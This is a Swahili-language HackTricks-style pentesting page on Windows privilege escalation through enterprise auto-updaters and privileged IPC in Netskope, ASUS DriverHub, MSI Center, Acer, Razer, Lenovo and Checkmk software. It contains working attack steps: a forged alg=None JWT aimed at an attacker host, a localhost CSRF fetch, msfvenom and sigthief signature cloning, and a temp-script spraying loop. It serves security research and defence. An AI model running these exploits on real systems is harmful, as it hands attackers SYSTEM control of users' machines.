# Kutumia Vibaya Enterprise Auto-Updaters na Privileged IPC (mf., Netskope, ASUS na MSI)

{{#include ../../banners/hacktricks-training.md}}

Ukurasa huu unaeleza kwa ujumla aina ya minyororo ya Windows local privilege escalation inayopatikana kwenye enterprise endpoint agents na updaters zinazotoa IPC surface iliyo rahisi kufikiwa na mtiririko wa update wenye priviliji za juu. Mfano unaowakilisha hali hii ni Netskope Client for Windows < R129 (CVE-2025-0309), ambapo mtumiaji mwenye priviliji za chini anaweza kulazimisha kujiandikisha kwenye server inayodhibitiwa na mshambulizi, kisha kuwasilisha MSI hasidi ambayo huduma ya SYSTEM huisakinisha.<sup>[[1]](#references)[[2]](#references)[[5]](#references)</sup>

Mawazo muhimu unayoweza kutumia tena dhidi ya bidhaa zinazofanana:
- Tumia vibaya localhost IPC ya huduma yenye priviliji za juu ili kulazimisha kujiandikisha tena au kubadilisha usanidi kuelekea server ya mshambulizi.
- Tekeleza update endpoints za vendor, wasilisha Trusted Root CA hasidi, kisha elekeza updater kwenye package hasidi “iliyotiwa saini”.
- Epuka ukaguzi dhaifu wa signer (orodha zinazoruhusu CN), digest flags za hiari, na MSI properties zisizo na masharti makali.
- Ikiwa IPC “imesimbwa”, pata key/IV kutoka kwa machine identifiers zinazosomeka na kila mtu na kuhifadhiwa kwenye registry.
- Ikiwa huduma inazuia callers kulingana na image path/process name, ingiza msimbo kwenye process iliyo kwenye allow-list au anzisha moja ikiwa imesimamishwa kisha uanzishe DLL yako kupitia marekebisho madogo ya thread-context.

Huduma maalum za TCP za ndani zinahitaji ukaguzi uleule wa utambulisho na mipaka ya ingizo, hata zinapohitaji PIN au kitambulisho kingine cha programu. Tambua process inayohudumia listener na akaunti ya huduma inayotumika, kisha kagua binary/version halisi iliyosambazwa na kama sehemu zinazodhibitiwa na caller hukaguliwa urefu kabla ya kunakiliwa kwenye fixed buffers au kutumika kuunda amri ya child-process. [Mwongozo wa Microsoft kuhusu buffer overrun](https://learn.microsoft.com/en-us/windows/win32/secbp/avoiding-buffer-overruns) unaeleza kwa nini ingizo la nje lisilokaguliwa ni hatari katika msimbo asilia wenye priviliji za juu. Listener ya loopback, credential iliyowekwa moja kwa moja kwenye msimbo, au process name pekee havithibitishi memory corruption au utekelezaji wa SYSTEM; reachability, authorization, code path, na mitigations ni masharti tofauti. Fanya enumeration ya kawaida kwa njia tulivu badala ya kutuma ingizo refu kiasi cha kusababisha crash kwenye huduma inayotumika.

---
## 1) Kulazimisha kujiandikisha kwenye server ya mshambulizi kupitia localhost IPC

Agents nyingi huja na mchakato wa UI wa user-mode unaowasiliana na huduma ya SYSTEM kupitia localhost TCP kwa kutumia JSON.

Kilichoonekana kwenye Netskope:
- UI: stAgentUI (low integrity) ↔ Service: stAgentSvc (SYSTEM)
- IPC command ID 148: IDP_USER_PROVISIONING_WITH_TOKEN

Mtiririko wa exploit:
1) Tengeneza tokeni ya enrollment ya JWT ambayo claims zake hudhibiti backend host (mf., AddonUrl). Tumia alg=None ili saini isihitajike.
2) Tuma ujumbe wa IPC unaoita amri ya provisioning ukiwa na JWT na jina la tenant yako:

```json
{
  "148": {
    "idpTokenValue": "<JWT with AddonUrl=attacker-host; header alg=None>",
    "tenantName": "TestOrg"
  }
}
```

3) Huduma inaanza kutuma maombi kwa server yako hasidi kwa ajili ya enrollment/config, k.m.:
- /v1/externalhost?service=enrollment
- /config/user/getbrandingbyemail

Vidokezo:
- Ikiwa uthibitishaji wa caller unategemea path/name, anzisha ombi kutoka kwa binary ya vendor iliyo kwenye allow-list (tazama §4).<sup>[[1]](#references)[[2]](#references)</sup>

### IPC ya usimamizi iliyo wazi kwenye mtandao

Mpaka huu wa uaminifu hauishii kila wakati kwenye localhost. Katika kisa kilichoripotiwa cha MyReport Updater 2.1.1, huduma ya `LocalSystem` ilisikiliza kwenye interfaces zote na kukubali mabadiliko ya usanidi wa gRPC bila uthibitishaji kwa host rejea, port na hali ya uendeshaji. Kwa variant ya mbali, ilihitajika ufikiaji wa mtandao kwa listener na ufikiaji wa nje kutoka kwa huduma hadi kwenye reference iliyochaguliwa. Tathmini mambo haya kando na iwapo mtiririko wa package unaofuata unaweza kuvuka mpaka wa uandishi wa faili.<sup>[[16]](#references)</sup>

---
## 2) Kuteka nyara channel ya update ili kuendesha code kama SYSTEM

Mara client inapowasiliana na server yako, tekeleza endpoints zinazotarajiwa na uielekeze kwenye MSI inayodhibitiwa na mshambuliaji. Mfuatano wa kawaida:

1) /v2/config/org/clientconfig → Rudisha usanidi wa JSON wenye muda mfupi sana wa updater, k.m.:
```json
{
  "clientUpdate": { "updateIntervalInMin": 1 },
  "check_msi_digest": false
}
```
2) /config/ca/cert → Rudisha cheti cha PEM CA. Huduma hukisakinisha kwenye hifadhi ya Local Machine Trusted Root.
3) /v2/checkupdate → Toa metadata inayoelekeza kwenye MSI hasidi na toleo la kughushi.

Kukwepa ukaguzi wa kawaida unaoonekana mara nyingi:
- Orodha ya kuruhusu Signer CN: huduma inaweza kuangalia tu kama Subject CN ni “netSkope Inc” au “Netskope, Inc.”. CA yako ya kitapeli inaweza kutoa leaf yenye CN hiyo na kusaini MSI.
- Sifa ya CERT_DIGEST: jumuisha sifa ya MSI isiyo na madhara inayoitwa CERT_DIGEST. Hakuna uthibitishaji wakati wa usakinishaji.
- Utekelezaji wa hiari wa digest: bendera ya usanidi (kwa mfano, check_msi_digest=false) huzima uthibitishaji wa ziada wa kriptografia.

Matokeo: huduma ya SYSTEM husakinisha MSI yako kutoka
C:\ProgramData\Netskope\stAgent\data\*.msi
na kutekeleza msimbo wowote kama NT AUTHORITY\SYSTEM.<sup>[[1]](#references)[[2]](#references)</sup>

Somo la kukwepa patch: ikiwa vendor atajibu kwa kuruhusu orodha ndogo ya domain “zinazoaminika” badala ya kuthibitisha chanzo cha update kwa kriptografia, tafuta redirector au reverse proxy zinazomilikiwa na vendor ambazo bado zinakuruhusu kuelekeza trafiki. Katika kesi ya Netskope, utafiti wa umma uliofuata ulionyesha kuwa orodha ya kuruhusu ya enzi ya R129 bado ingeweza kutumiwa vibaya kupitia `rproxy.goskope.com`, ambayo ilipitisha maudhui ya Azure App Service yaliyodhibitiwa na mshambulizi. Chukulia orodha za kuruhusu hostname kama kikwazo kidogo, si kama mpaka wa uaminifu.<sup>[[14]](#references)</sup>

Aina nyingine ya hitilafu ni **metadata ya package inayojithibitisha yenyewe lakini haijathibitishwa**. Katika kesi ya MyReport, rejeleo lililodhibitiwa na mshambulizi lilitoa archive iliyorekebishwa huku mpatanishi akibadilisha majibu ya MD5 digest na ukubwa ya vendor kabla hayajafika kwa updater. Kulinganisha thamani hizo kulithibitisha tu uthabiti wa majibu, si chanzo cha vendor; hakuna MD5 collision iliyohitajika. Kisha, saraka ya usakinishaji iliyochaguliwa na mwitaji ilifanya uchimbuaji wenye mamlaka ya juu kuwa mpaka wa kuandika faili. Primitive ya kupakia DLL inayotokana na hili imeelezwa katika [kuunganisha uandishi wa faili kiholela na utekaji wa DLL](dll-hijacking/#chaining-an-arbitrary-file-write-into-a-missing-dll-hijack).<sup>[[16]](#references)</sup>

---
## 3) Kutengeneza maombi ya IPC yaliyosimbwa (yanapokuwepo)

Kuanzia R127, Netskope ilifunga JSON ya IPC ndani ya sehemu ya encryptData inayoonekana kama Base64. Reverse engineering ilionyesha AES yenye key/IV zilizotokana na thamani za registry zinazoweza kusomwa na mtumiaji yeyote:
- Key = HKLM\SOFTWARE\NetSkope\Provisioning\nsdeviceidnew
- IV  = HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductID

Washambuliaji wanaweza kurudia usimbaji na kutuma amri halali zilizofichwa kwa usimbaji kutoka kwa mtumiaji wa kawaida.<sup>[[1]](#references)[[2]](#references)</sup> Dokezo la jumla: ikiwa agent itaanza ghafla “kusimba” IPC, tafuta device ID, product GUID na install ID chini ya HKLM kama nyenzo.

---
## 4) Kukwepa orodha za kuruhusu za wapigaji wa IPC (ukaguzi wa path/jina)

Baadhi ya huduma hujaribu kuthibitisha upande mwingine kwa kutambua PID ya muunganisho wa TCP na kulinganisha image path/jina lake na binary za vendor zilizo kwenye orodha ya kuruhusu na zilizoko chini ya Program Files (kwa mfano, stagentui.exe, bwansvc.exe, epdlp.exe).

Njia mbili za vitendo za kukwepa:
- DLL injection kwenye mchakato ulio kwenye orodha ya kuruhusu (kwa mfano, nsdiag.exe) na kutuma IPC kupitia proxy kutoka ndani yake.
- Anzisha binary iliyo kwenye orodha ya kuruhusu ikiwa imesimamishwa, kisha anzisha proxy DLL yako bila CreateRemoteThread (tazama §5) ili kutimiza masharti ya driver ya kuzuia kuchezea.<sup>[[1]](#references)[[2]](#references)</sup>

---
## 5) Injection inayokubaliana na ulinzi dhidi ya kuchezea: mchakato uliosimamishwa + NtContinue patch

Bidhaa mara nyingi husambaza driver ya minifilter/OB callbacks (kwa mfano, Stadrv) ili kuondoa haki hatari kwenye handles za michakato iliyolindwa:
- Process: huondoa PROCESS_TERMINATE, PROCESS_CREATE_THREAD, PROCESS_VM_READ, PROCESS_DUP_HANDLE, PROCESS_SUSPEND_RESUME
- Thread: huruhusu tu THREAD_GET_CONTEXT, THREAD_QUERY_LIMITED_INFORMATION, THREAD_RESUME, SYNCHRONIZE

Loader ya user-mode inayoaminika na inayozingatia vikwazo hivi:
1) Tumia CreateProcess kwa binary ya vendor ikiwa na CREATE_SUSPENDED.
2) Pata handles ambazo bado zinaruhusiwa kwako: PROCESS_VM_WRITE | PROCESS_VM_OPERATION kwenye mchakato, na handle ya thread yenye THREAD_GET_CONTEXT/THREAD_SET_CONTEXT (au THREAD_RESUME pekee ikiwa unarekebisha code kwenye RIP inayojulikana).
3) Andika juu ya ntdll!NtContinue (au thunk nyingine ya mapema ambayo imehakikishwa kuwa imepakiwa) kwa stub ndogo inayopiga LoadLibraryW kwenye path ya DLL yako, kisha kuruka kurudi.
4) Tumia ResumeThread kuendesha stub yako ndani ya mchakato na kupakia DLL yako.

Kwa kuwa hukutumia PROCESS_CREATE_THREAD au PROCESS_SUSPEND_RESUME kwenye mchakato ambao tayari umelindwa (uliuunda wewe mwenyewe), sera ya driver inatimizwa.<sup>[[1]](#references)[[2]](#references)</sup>

---
## 6) Zana za vitendo
- NachoVPN (Netskope plugin) huweka kiotomatiki CA ya kitapeli, kusaini MSI hasidi, na kutoa endpoint zinazohitajika: /v2/config/org/clientconfig, /config/ca/cert, /v2/checkupdate.<sup>[[3]](#references)</sup>
- UpSkope ni mteja maalum wa IPC anayetengeneza ujumbe wa IPC kiholela (unaoweza kusimbwa kwa AES kwa hiari) na kujumuisha injection ya mchakato uliosimamishwa ili kuanzisha mawasiliano kutoka kwa binary iliyo kwenye orodha ya kuruhusu.<sup>[[4]](#references)</sup>

## 7) Mchakato wa haraka wa kuchunguza nyuso zisizojulikana za updater/IPC

Unapokutana na endpoint agent mpya au seti ya programu saidizi ya motherboard, mchakato wa haraka kwa kawaida unatosha kubaini kama unachunguza shabaha nzuri ya privesc:<sup>[[6]](#references)</sup>

1) Orodhesha wasikilizaji wa loopback na uhusishe na michakato ya vendor:

```powershell
Get-NetTCPConnection -State Listen |
  Where-Object {$_.LocalAddress -in @('127.0.0.1', '::1', '0.0.0.0', '::')} |
  Select-Object LocalAddress,LocalPort,OwningProcess,
    @{n='Process';e={(Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue).Path}}
```

2) Orodhesha named pipes zinazoweza kutumika:

```powershell
[System.IO.Directory]::GetFiles("\\.\pipe\") | Select-String -Pattern 'asus|msi|razer|acer|agent|update'
```

3) Chimba data ya routing inayotegemea registry inayotumiwa na seva za IPC zinazotumia plugins:

```powershell
Get-ChildItem 'HKLM:\SOFTWARE\WOW6432Node\MSI\MSI Center\Component' |
  Select-Object PSChildName
```

4) Kwanza, toa majina ya endpoint, funguo za JSON na vitambulisho vya command kutoka kwa client ya user-mode. Frontend za Electron/.NET zilizofungwa kwenye kifurushi mara nyingi hu-leak schema nzima:

```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.js','C:\Program Files\Vendor\**\*.dll' `
  -Pattern '127.0.0.1|localhost|UpdateApp|checkupdate|NamedPipe|LaunchProcess|Origin'
```

5) Tafuta predicate halisi ya uaminifu, si njia ya code ambayo hatimaye huzindua mchakato:

```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.exe','C:\Program Files\Vendor\**\*.dll','C:\Program Files\Vendor\**\*.js' `
  -Pattern 'WinVerifyTrust|CryptQueryObject|Origin|Referer|Subject|CN=|ExecuteTask|LaunchProcess|CreateProcessAsUser'
```

Mifumo inayofaa kuipa kipaumbele:
- `CryptQueryObject`/uchanganuzi wa cheti bila `WinVerifyTrust` kwa kawaida humaanisha kuwa “cheti kipo” kulichukuliwa kuwa “cheti kinaaminika”, jambo linalowezesha cloning ya cheti au hila nyingine za signer bandia.
- Ukaguzi wa substring/suffix kwenye `Origin`, `Referer`, URL za upakuaji, majina ya process, au CN za signer si uthibitishaji. `contains(".vendor.com")` kwa kawaida inaweza kutumiwa vibaya kupitia domain zinazofanana zinazodhibitiwa na mshambuliaji.
- Ikiwa GUI yenye ruhusa ndogo ndiyo huamua “faili linaaminika” na SYSTEM broker huchukua tu matokeo hayo, kurekebisha au kutekeleza upya DLL/JS ya upande wa client mara nyingi hupita kabisa mpaka wa usalama (mgawanyo wa uthibitishaji wa mtindo wa Razer).
- Ikiwa broker inakili payload hadi `%TEMP%`/`C:\Windows\Temp` kisha inathibitisha au kuipanga itekelezwe kutoka kwenye njia hiyo, jaribu mara moja madirisha ya muda ya uingizwaji wa TOCTOU na moduli za plugin jirani zinazofichua wrappers mbadala za `ExecuteTask()` zenye ukaguzi dhaifu zaidi.<sup>[[6]](#references)</sup>

Kwa targets zinazotumia sana named pipe, PipeViewer ni njia ya haraka ya kugundua DACL dhaifu na pipe zinazoweza kufikiwa kwa mbali kabla hujaanza kureverse protocol kwa kina.<sup>[[11]](#references)</sup>

Ikiwa target inathibitisha callers kwa kutumia PID, njia ya image, au jina la process pekee, ichukulie hiyo kama kikwazo kidogo badala ya mpaka wa usalama: kuingiza code kwenye client halali, au kuanzisha connection kutoka kwa process iliyo kwenye allow-list, mara nyingi hutosha kutimiza ukaguzi wa server. Kwa named pipes hasa, [ukurasa huu kuhusu client impersonation na matumizi mabaya ya pipe](named-pipe-client-impersonation.md) unaeleza primitive hiyo kwa undani zaidi.

Kwa **cleanup au restore broker** yenye ruhusa za juu, kagua mpaka wa uaminifu wa njia pamoja na ACL ya pipe. Caller mwenye ruhusa ndogo anaweza kuchagua destination ya restore au kubadilisha jina la backup artifact iliyoandaliwa katika shared directory, hata kama service executable na install directory yake zinalindwa. Thibitisha tofauti kwamba caller anaweza kufikia restore command, anaweza kurekebisha input au filename husika iliyoandaliwa, broker inaendeshwa kwa identity yenye ruhusa za juu, na operesheni yake ya restore huandika kweli kwenye njia iliyochaguliwa na kulindwa. Staging directory inayoweza kuandikwa au pipe inayoweza kusomeka pekee haithibitishi uwezekano wa arbitrary privileged write; destination mapping na tabia ya service vinahitaji code review au majaribio yanayodhibitiwa. Usiendeshe cleanup command usiyoijua wakati wa passive enumeration kwa sababu inaweza kufuta faili za mtumiaji.

---
## 8) Modular add-in brokers zinazothibitisha kwa saini za vendor pekee (mtindo wa Lenovo Vantage)

Tofauti mpya zaidi inayofaa kutafutwa ni **signed-client RPC broker**: process ya desktop yenye ruhusa ndogo iliyosainiwa na Lenovo huwasiliana na service ya SYSTEM, na service huelekeza amri za JSON kwenye seti ya add-ins zilizoelezwa kwa XML chini ya `%ProgramData%`. Mara tu code execution inapopatikana **ndani ya client yoyote ya signed inayokubaliwa**, kila contract yenye `runas="system"` huwa sehemu ya attack surface yako.<sup>[[15]](#references)</sup>

Primitive zenye thamani kubwa zilizoonekana kwenye utafiti wa Lenovo Vantage:
- **Kuamini caller kwa sababu tu imesainiwa na vendor**: watafiti walipata authenticated context kwa kunakili EXE iliyosainiwa na Lenovo hadi kwenye directory inayoweza kuandikwa na kutimiza DLL side-load (`profapi.dll`) ili code ya kiholela iendeshwe ndani ya client ambayo service tayari iliiamini.
- **Ugunduzi wa attack surface unaoongozwa na manifest**: add-ins hutangazwa chini ya `C:\ProgramData\Lenovo\Vantage\Addins\*.xml`; contracts kadhaa huendeshwa kama `SYSTEM`, kwa hiyo kuorodhesha manifests hizo mara nyingi hufichua verbs halisi zenye ruhusa za juu haraka zaidi kuliko kureverse broker yenyewe.
- **Hitilafu za kila command nyuma ya authenticated channel**: baada ya kuingia ndani ya client inayoaminika, utafiti wa umma ulipata path-traversal pamoja na race conditions kwenye verbs za update/install, matumizi mabaya ya raw-SQL kwenye privileged settings databases, na ukaguzi wa njia za registry unaotegemea substring ambao uliwezesha kuandika nje ya hive iliyokusudiwa.

Uchunguzi wa awali unaofaa kwenye target:

```powershell
Get-ChildItem "$env:ProgramData\Lenovo\Vantage\Addins" -Filter *.xml |
  Select-String -Pattern 'runas="system"|<name>|<namespace>'
```

```powershell
Select-String -Path 'C:\Program Files\Lenovo\**\*.dll','C:\Program Files\Lenovo\**\*.exe' `
  -Pattern 'contract|command|payload|DeleteTable|DeleteSetting|Set-KeyChildren|DownloadAndInstallAppComponent|InstallOnly'
```

Hitimisho la vitendo: kila seti ya zana saidizi inapofichua broker ambayo kwanza huthibitisha **mchakato wa caller** kisha kuelekeza maombi kwa amri nyingi za plugin/add-in, usiishie baada ya kupita ukaguzi wa uaminifu wa awali. Toa jedwali la manifest/contract na ufanye fuzzing ya kila amri yenye privilege ya juu kivyake; kwa kawaida channel iliyothibitishwa huficha hitilafu kadhaa za hatua ya pili.

---
## 1) CSRF kutoka browser hadi localhost dhidi ya HTTP API zenye privilege ya juu (ASUS DriverHub)

DriverHub husambaza huduma ya HTTP ya user-mode (ADU.exe) kwenye 127.0.0.1:53000 inayotarajia maombi ya browser kutoka https://driverhub.asus.com. Kichujio cha origin hufanya tu `string_contains(".asus.com")` kwenye kichwa cha Origin na kwenye URL za upakuaji zinazofichuliwa na `/asus/v1.0/*`. Kwa hiyo, host yoyote inayodhibitiwa na mshambuliaji kama `https://driverhub.asus.com.attacker.tld` hupita ukaguzi na inaweza kutuma maombi yanayobadilisha hali kupitia JavaScript.<sup>[[6]](#references)</sup> Angalia [misingi ya CSRF](../../pentesting-web/csrf-cross-site-request-forgery.md) kwa mifumo mingine ya kupita ukaguzi.

Mtiririko wa vitendo:
1) Sajili domain iliyo na `.asus.com` ndani yake na uweke hapo ukurasa hatari.
2) Tumia `fetch` au XHR kuita endpoint yenye privilege ya juu (kwa mfano, `Reboot`, `UpdateApp`) kwenye `http://127.0.0.1:53000`.
3) Tuma JSON body inayotarajiwa na handler – JS iliyopakiwa ya frontend inaonyesha schema hapa chini.

```javascript
fetch("http://127.0.0.1:53000/asus/v1.0/Reboot", {
  method: "POST",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({ Event: [{ Cmd: "Reboot" }] })
});
```

Hata CLI ya PowerShell iliyoonyeshwa hapa chini hufaulu wakati kichwa cha Origin kinapoghushiwa ili kiwe na thamani inayoaminika:

```powershell
Invoke-WebRequest -Uri "http://127.0.0.1:53000/asus/v1.0/Reboot" -Method Post \
  -Headers @{Origin="https://driverhub.asus.com"; "Content-Type"="application/json"} \
  -Body (@{Event=@(@{Cmd="Reboot"})}|ConvertTo-Json)
```

Kutembelea tovuti ya mshambuliaji kwa hivyo hugeuka kuwa CSRF ya ndani inayohitaji kubofya mara 1 (au mibofyo 0 kupitia `onload`) ili kuendesha helper yenye SYSTEM.

---
## 2) Uthibitishaji usio salama wa code-signing na cloning ya cheti (ASUS UpdateApp)

`/asus/v1.0/UpdateApp` hupakua executables zozote zilizoainishwa kwenye JSON body na kuziweka kwenye cache ya `C:\ProgramData\ASUS\AsusDriverHub\SupportTemp`. Uthibitishaji wa URL ya upakuaji hutumia tena mantiki ileile ya kutafuta substring, hivyo `http://updates.asus.com.attacker.tld:8000/payload.exe` inakubaliwa. Baada ya kupakua, ADU.exe hukagua tu kwamba PE ina signature na kwamba kamba ya Subject inalingana na ASUS kabla ya kuiendesha — hakuna `WinVerifyTrust` wala uthibitishaji wa chain.

Ili kutumia vibaya mtiririko huu:
1) Tengeneza payload (kwa mfano, `msfvenom -p windows/exec CMD=notepad.exe -f exe -o payload.exe`).
2) Clone signer ya ASUS ndani yake (kwa mfano, `python sigthief.py -i ASUS-DriverHub-Installer.exe -t payload.exe -o pwn.exe`).
3) Host `pwn.exe` kwenye domain bandia inayofanana na `.asus.com` na uanzishe UpdateApp kupitia CSRF ya browser hapo juu.

Kwa kuwa vichujio vya Origin na URL vinategemea substring, na ukaguzi wa signer hulinganisha kamba pekee, DriverHub hupakua na kutekeleza binary ya mshambuliaji ikiwa na muktadha wake wenye ruhusa za juu.<sup>[[6]](#references)</sup>

---
## 1) TOCTOU ndani ya njia za kunakili/kutekeleza za updater (MSI Center CMD_AutoUpdateSDK)

Huduma ya SYSTEM ya MSI Center hutoa protocol ya TCP ambapo kila frame ni `4-byte ComponentID || 8-byte CommandID || ASCII arguments`. Component kuu (Component ID `0f 27 00 00`) husambaza `CMD_AutoUpdateSDK = {05 03 01 08 FF FF FF FC}`. Handler yake:
1) Hunakili executable iliyotolewa kwenda `C:\Windows\Temp\MSI Center SDK.exe`.
2) Huthibitisha signature kupitia `CS_CommonAPI.EX_CA::Verify` (subject ya cheti lazima ilingane na “MICRO-STAR INTERNATIONAL CO., LTD.” na `WinVerifyTrust` ifanikiwe).
3) Huunda scheduled task inayoendesha faili ya muda kama SYSTEM ikiwa na arguments zinazodhibitiwa na mshambuliaji.

Faili lililonakiliwa halifungwi kati ya uthibitishaji na `ExecuteTask()`. Mshambuliaji anaweza:
- Kutuma Frame A inayoelekeza kwenye binary halali iliyosainiwa na MSI (inahakikisha ukaguzi wa signature unafaulu na task inawekwa kwenye foleni).
- Kushindania kwa kutuma mara kwa mara ujumbe wa Frame B unaoelekeza kwenye payload hasidi, na kubadilisha `MSI Center SDK.exe` mara tu baada ya uthibitishaji kukamilika.

Scheduler inapotekeleza task, huendesha payload iliyobadilishwa kama SYSTEM licha ya kuwa faili asili ndilo lililothibitishwa. Exploitation ya kuaminika hutumia goroutines/threads mbili zinazotuma CMD_AutoUpdateSDK mfululizo hadi kushinda dirisha la TOCTOU.<sup>[[6]](#references)</sup>

---
## 2) Kutumia vibaya custom SYSTEM-level IPC na impersonation (MSI Center + Acer Control Centre)

### Seti za amri za MSI Center TCP
- Kila plugin/DLL inayopakiwa na `MSI.CentralServer.exe` hupokea Component ID iliyohifadhiwa chini ya `HKLM\SOFTWARE\MSI\MSI_CentralServer`. Baiti 4 za kwanza za frame huchagua component hiyo, hivyo kuruhusu washambuliaji kuelekeza amri kwenye modules zozote.
- Plugins zinaweza kufafanua task runners zao. `Support\API_Support.dll` hutoa `CMD_Common_RunAMDVbFlashSetup = {05 03 01 08 01 00 03 03}` na huita moja kwa moja `API_Support.EX_Task::ExecuteTask()` bila uthibitishaji wa signature — mtumiaji yeyote wa ndani anaweza kuielekeza kwenye `C:\Users\<user>\Desktop\payload.exe` na kupata utekelezaji wa SYSTEM kwa uhakika.
- Kunusa loopback kwa Wireshark au kuchunguza binaries za .NET ndani ya dnSpy hufichua haraka uhusiano wa Component ↔ command; kisha clients maalum za Go/Python zinaweza kurudia kutuma frames.<sup>[[6]](#references)</sup>

### Named pipes za Acer Control Centre na viwango vya impersonation
- `ACCSvc.exe` (SYSTEM) hutoa `\\.\pipe\treadstone_service_LightMode`, na discretionary ACL yake huruhusu clients za mbali (kwa mfano, `\\TARGET\pipe\treadstone_service_LightMode`). Kutuma command ID `7` pamoja na njia ya faili huanzisha utaratibu wa huduma wa kuanzisha process.
- Client library huserializa baiti ya mwisho maalum (113) pamoja na args. Dynamic instrumentation kwa Frida/`TsDotNetLib` (tazama [Zana za Reversing na Mbinu za Msingi](../../reversing/reversing-tools-basic-methods/README.md) kwa vidokezo vya instrumentation) huonyesha kwamba native handler hubadilisha thamani hii kuwa `SECURITY_IMPERSONATION_LEVEL` na integrity SID kabla ya kuita `CreateProcessAsUser`.
- Kubadilisha 113 (`0x71`) na 114 (`0x72`) huingia kwenye generic branch inayohifadhi token kamili ya SYSTEM na kuweka high-integrity SID (`S-1-16-12288`). Kwa hivyo binary inayoanzishwa huendeshwa kama SYSTEM isiyo na vizuizi, ndani ya mashine na kati ya mashine.
- Changanya hilo na installer flag iliyo wazi (`Setup.exe -nocheck`) ili kusakinisha ACC hata kwenye lab VMs na kujaribu pipe bila hardware ya vendor.<sup>[[6]](#references)</sup>

Hitilafu hizi za IPC zinaonyesha kwa nini huduma za localhost lazima zilazimishe mutual authentication (ALPC SIDs, vichujio vya `ImpersonationLevel=Impersonation`, uchujaji wa token) na kwa nini helper ya kila module ya “run arbitrary binary” lazima itumie uthibitishaji uleule wa signer.

---
## 3) Helpers za COM/IPC “elevator” zinazotegemea uthibitishaji dhaifu wa user-mode (Razer Synapse 4)

Razer Synapse 4 iliongeza muundo mwingine muhimu katika familia hii: mtumiaji mwenye ruhusa ndogo anaweza kuiomba COM helper ianzishe process kupitia `RzUtility.Elevator`, huku uamuzi wa uaminifu ukikabidhiwa kwa DLL ya user-mode (`simple_service.dll`) badala ya kutekelezwa kwa uthabiti ndani ya mpaka wenye ruhusa za juu.

Njia ya exploitation iliyoonekana:
- Unda instance ya COM object `RzUtility.Elevator`.
- Ita `LaunchProcessNoWait(<path>, "", 1)` ili kuomba uzinduzi wenye ruhusa za juu.
- Kwenye public PoC, kizuizi cha PE-signature ndani ya `simple_service.dll` huondolewa kwa patch kabla ya kutuma ombi, na hivyo kuruhusu executable yoyote iliyochaguliwa na mshambuliaji kuzinduliwa.<sup>[[6]](#references)[[10]](#references)</sup>

Mwito mfupi wa PowerShell:

```powershell
$com = New-Object -ComObject 'RzUtility.Elevator'
$com.LaunchProcessNoWait("C:\Users\Public\payload.exe", "", 1)
```

Hitimisho la jumla: unapofanya reverse engineering ya suite za “helper”, usiishie kwenye localhost TCP au named pipes. Angalia COM classes zenye majina kama `Elevator`, `Launcher`, `Updater`, au `Utility`, kisha hakikisha kama huduma yenye mamlaka ya juu inathibitisha yenyewe binary lengwa au inaamini tu matokeo yaliyokokotolewa na client DLL ya user-mode inayoweza kurekebishwa. Muundo huu hauishii kwa Razer: muundo wowote uliogawanywa ambapo broker yenye mamlaka ya juu hutumia uamuzi wa kuruhusu/kukataa kutoka upande wenye mamlaka ya chini unaweza kuwa eneo la privesc.

---
## Utekelezaji wa script ya temp inayotabirika wakati wa MSI repair (Checkmk Agent / CVE-2024-0670)

Baadhi ya Windows agents bado hutekeleza vitendo vyenye mamlaka ya juu kwa kuandika `.cmd` ya muda kwenye `C:\Windows\Temp` na kuiendesha kama `SYSTEM`. Ikiwa jina la faili linatabirika na huduma haiundi upya faili zilizopo kwa usalama, mtumiaji mwenye mamlaka ya chini anaweza kuunda mapema faili ya temp inayotarajiwa na kuiweka **read-only**, kisha kusababisha mchakato wenye mamlaka ya juu utekeleze maudhui yanayodhibitiwa na mshambuliaji badala ya script yake yenyewe.

Imeonekana katika builds za Checkmk Agent zilizo hatarini:
- muundo wa temp: `cmk_all_<PID>_1.cmd`
- matawi yaliyoathirika: `2.0.0`, `2.1.0`, `2.2.0`
- kichochezi: MSI **repair** ya package ya agent iliyohifadhiwa kwenye cache<sup>[[8]](#references)[[9]](#references)</sup>

Mtiririko wa kazi wa vitendo:
1. Kadiria wigo halisi wa PID kutokana na process IDs za sasa au PID ya agent inayoendesha.
2. Andika payload fupi ya `.cmd` ya **ASCII** (`Set-Content -Encoding Ascii` au uelekezaji wa `cmd.exe`; epuka matokeo ya PowerShell ya UTF-16 kwa batch files).
3. Nyunyizia `C:\Windows\Temp\cmk_all_<PID>_1.cmd` katika wigo lengwa na uweke kila faili kuwa read-only.
4. Anzisha repair ya MSI iliyohifadhiwa kwenye cache ili huduma yenye mamlaka ya juu ijaribu kutengeneza upya kisha kutekeleza script ya temp.<sup>[[7]](#references)</sup>

```powershell
Set-Content -Path C:\ProgramData\payload.cmd -Encoding Ascii -Value "@echo off`nwhoami > C:\ProgramData\proof.txt"
1..10000 | ForEach-Object {
  Copy-Item C:\ProgramData\payload.cmd "C:\Windows\Temp\cmk_all_${_}_1.cmd"
  Set-ItemProperty "C:\Windows\Temp\cmk_all_${_}_1.cmd" -Name IsReadOnly -Value $true
}
```

Ikiwa bidhaa iliyo hatarini imesakinishwa kwa kutumia Windows Installer, tambua jina la bidhaa linalolingana na faili ya MSI iliyo kwenye akiba na yenye jina linaloonekana la nasibu chini ya `C:\Windows\Installer` kabla ya kuanzisha ukarabati:<sup>[[7]](#references)</sup>

```powershell
Get-ChildItem "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-18\Products\*\InstallProperties" |
  ForEach-Object {
    $p = Get-ItemProperty $_.PSPath
    [PSCustomObject]@{Name=$p.DisplayName; Pkg=$p.LocalPackage}
  } | Where-Object Name -like "*Check MK Agent*"

msiexec /fa C:\Windows\Installer\<cached-agent>.msi
```

Maelezo ya kiutendaji:
- `qwinsta` ni muhimu pale `msiexec /fa` inaposhindwa kutoka kwenye WinRM shell isiyoingiliana, na unahitaji kujua kama session iliyopo ya desktop/iliyokatika muunganisho inaweza kuanzisha repair ipasavyo.<sup>[[7]](#references)</sup>
- Muundo huu unatumika pia kwa endpoint agents na updaters wengine wanaoweka scripts za muda katika maeneo yanayoweza kuandikiwa na kila mtu, kisha kuzitekeleza kama SYSTEM. Jaribu kuona kama majina yanatabirika, kama semantiki za exclusive create hazipo, na kama michakato ya repair/update inaweza kuanzishwa unapotaka.

### Repair ya installer inayoingiliana na console yenye ruhusa za juu

